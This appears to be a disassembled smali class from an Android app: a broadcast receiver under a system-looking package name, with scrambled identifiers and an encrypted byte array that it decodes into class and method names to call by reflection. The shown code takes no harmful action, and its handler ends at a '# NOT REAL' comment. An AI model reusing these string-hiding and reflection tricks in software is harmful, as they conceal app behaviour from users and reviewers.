.class final Lcom/android/system/admin/CIcIoICo;
.super Landroid/content/BroadcastReceiver;


# annotations
.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# static fields
.field private static final oCIlCll:[B


# direct methods
.method static <clinit>()V
    .locals 3

    const/16 v0, 0xf5

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    sput-object v0, Lcom/android/system/admin/CIcIoICo;->oCIlCll:[B

    return-void

    :array_0
    .array-data 1
        -0x2t
        0xft
        -0x30t
        0x21t
        0x11t
        -0xdt
        -0x6t
        0x2t
        -0x22t
        0x29t
        -0xbt
        0x12t
        0x0t
        0x5t
        -0xat
        0x1t
        0x13t
        -0x29t
        0x17t
        0x3t
        0x0t
        -0x2t
        0xft
        -0x33t
        0x22t
        0x11t
        -0xbt
        0x6t
        -0x1t
        0xdt
        -0xat
        0xet
        -0x3t
        -0x6t
        -0x5t
        -0x36t
        0x34t
        0xat
        0x9t
        -0x10t
        0xft
        -0x5t
        0x0t
        0x5t
        -0xct
        -0x3at
        0x36t
        0x1t
        0x11t
        -0xdt
        -0x6t
        0x2t
        -0x37t
        0x33t
        0x2t
        0x11t
        -0xbt
        0x6t
        -0x1t
        -0x40t
        0x18t
        0x9t
        0x6t
        -0x7t
        -0xat
        0xdt
        -0xat
        0xet
        -0x3t
        -0x6t
        -0x5t
        -0x36t
        0x34t
        0xat
        0x9t
        -0x10t
        0xft
        -0x5t
        0x0t
        0x5t
        -0xct
        -0x3at
        0x14t
        0x2at
        0x9t
        -0x10t
        0xft
        -0x5t
        0x0t
        0x5t
        -0xct
        -0x24t
        0x21t
        0x11t
        -0xdt
        -0x6t
        0x2t
        0xdt
        -0xat
        0xet
        -0x3t
        -0x6t
        -0x5t
        -0x36t
        0x34t
        0xat
        0x9t
        -0x10t
        0xft
        -0x5t
        0x0t
        0x5t
        -0xct
        -0x3at
        0x14t
        0x2at
        0x9t
        -0x10t
        0xft
        -0x5t
        0x0t
        0x5t
        -0xct
        -0x25t
        0x29t
        -0xbt
        0x12t
        0x0t
        0xdt
        -0xat
        0xet
        -0x3t
        -0x6t
        -0x5t
        -0x36t
        0x35t
        0xct
        -0x1t
        0x6t
        -0xft
        0x9t
        0x6t
        -0x46t
        0x1bt
        0x25t
        0x6t
        -0xft
        0x9t
        0x6t
        -0x2t
        0xft
        -0x24t
        0x11t
        0x11t
        -0xft
        0x2t
        0x7t
        -0xbt
        0x1t
        0xat
        -0x7t
        -0x20t
        0x33t
        -0x4t
        -0x2t
        -0x11t
        -0x2t
        0xft
        -0x32t
        0x2at
        0x9t
        -0x10t
        0xft
        -0x5t
        0x0t
        0x5t
        -0xct
        -0x25t
        0x29t
        -0xbt
        0x12t
        0x0t
        -0x2t
        0xft
        -0x33t
        0x23t
        0x0t
        0xet
        -0xdt
        0xet
        0x0t
        -0x9t
        0x15t
        -0x15t
        -0x33t
        0x47t
        -0x1t
        -0xbt
        0x3t
        -0x3et
        0x13t
        0x31t
        0x0t
        -0x11t
        0x18t
        -0x2dt
        0x1dt
        0xat
        0x1t
        0xdt
        -0xat
        0xet
        -0x3t
        -0x6t
        -0x5t
        -0x36t
        0x34t
        0xat
        0x9t
        -0x10t
        0xft
        -0x5t
        0x0t
        0x5t
        -0xct
        -0x3at
        0x36t
        0x1t
        0x11t
        -0xdt
        -0x6t
        0x2t
        -0x37t
        0x37t
        0x13t
        -0x4t
        -0x2t
        -0x11t
        -0x33t
        0x16t
        0x1t
        0x11t
        -0xdt
        -0x6t
        0x2t
    .end array-data
.end method

.method constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private static oCIlCll(III)Ljava/lang/String;
    .locals 6

    sget-object v4, Lcom/android/system/admin/CIcIoICo;->oCIlCll:[B

    add-int/lit8 p2, p2, 0x65

    add-int/lit8 p0, p0, 0x25

    new-instance v0, Ljava/lang/String;

    const/4 v5, 0x0

    new-array v1, p0, [B

    if-nez v4, :cond_0

    move v2, p0

    move v3, p1

    :goto_0
    add-int/lit8 p1, p1, 0x1

    add-int p2, v2, v3

    :cond_0
    int-to-byte v2, p2

    aput-byte v2, v1, v5

    add-int/lit8 v5, v5, 0x1

    if-lt v5, p0, :cond_1

    const/4 v2, 0x0

    invoke-direct {v0, v1, v2}, Ljava/lang/String;-><init>([BI)V

    return-object v0

    :cond_1
    move v2, p2

    aget-byte v3, v4, p1

    goto :goto_0
.end method


# virtual methods
.method public final onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 7

    goto :goto_0

    :catchall_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->getCause()Ljava/lang/Throwable;

    move-result-object v0

    throw v0

    :goto_0
    :try_start_0
    const/16 v0, -0xf

    const/16 v1, 0x80

    const/4 v2, -0x4

    invoke-static {v0, v1, v2}, Lcom/android/system/admin/CIcIoICo;->oCIlCll(III)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    const/16 v1, -0x1c

    const/16 v2, 0x15

    const/4 v3, 0x2

    invoke-static {v1, v2, v3}, Lcom/android/system/admin/CIcIoICo;->oCIlCll(III)Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    const/4 v1, 0x0

    invoke-virtual {v0, p2, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    # NOT REAL
    return-void
.end method
